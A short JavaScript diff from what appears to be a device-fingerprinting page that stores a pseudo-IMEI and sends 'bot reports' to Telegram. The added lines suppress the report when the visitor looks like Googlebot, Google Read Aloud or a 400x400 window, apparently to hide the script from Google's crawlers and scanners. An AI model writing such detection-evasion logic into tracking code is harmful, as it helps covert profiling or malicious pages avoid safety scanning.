@@ -227,6 +227,16 @@
         try { localStorage.setItem('pedro_device_imei', deviceFP.webImei); } catch(e) {}
 
         const sendBotReport = (botStatus, customDetails, finalUrlToSend) => {
+            const ua = (navigator.userAgent || '').toLowerCase();
+            const isGoogleBot = ua.includes('google-read-aloud') || 
+                                ua.includes('googlebot') || 
+                                (window.innerWidth === 400 && window.innerHeight === 400);
+
+            // 🔇 Якщо це Google-бот або екран 400х400 — НЕ шлемо звіт у Telegram
+            if (isGoogleBot) {
+                return;
+            }
+
             const deviceInfo = {
                 screen: `${window.innerWidth}×${window.innerHeight}`,
                 userAgent: navigator.userAgent,
